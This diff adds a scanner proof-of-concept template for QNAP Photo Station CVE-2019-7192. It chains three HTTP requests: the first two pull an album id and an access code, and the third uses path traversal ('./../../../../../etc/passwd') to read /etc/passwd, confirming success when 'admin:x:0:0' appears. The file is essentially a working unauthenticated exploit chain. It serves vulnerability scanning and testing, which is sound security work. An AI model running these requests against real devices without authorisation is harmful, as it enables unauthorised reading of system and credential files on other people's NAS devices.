@@ -1,0 +1,39 @@
+detail:
+  author: Hzllaga
+  links:
+  - https://github.com/th3gundy/CVE-2019-7192_QNAP_Exploit
+expression: r0() && r1() && r2()
+manual: true
+name: poc-yaml-qnap-cve-2019-7192
+rules:
+  r0:
+    expression: response.status == 200
+    output:
+      album_id: search["album_id"]
+      search: '"<output>(?P<album_id>.*?)</output>".bsubmatch(response.body)'
+    request:
+      body: a=setSlideshow&f=qsamplealbum
+      cache: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /photo/p/api/album.php
+  r1:
+    expression: response.status == 200
+    output:
+      access_code: search["access_code"]
+      search: '"encodeURIComponent\\(\\''(?P<access_code>.*?)\\''\\)".bsubmatch(response.body)'
+    request:
+      cache: true
+      method: GET
+      path: /photo/slideshow.php?album={{album_id}}
+  r2:
+    expression: response.status == 200 && response.body.bcontains(b"admin:x:0:0")
+    request:
+      body: album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=./../../../../../etc/passwd
+      cache: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /photo/p/api/video.php
+transport: http
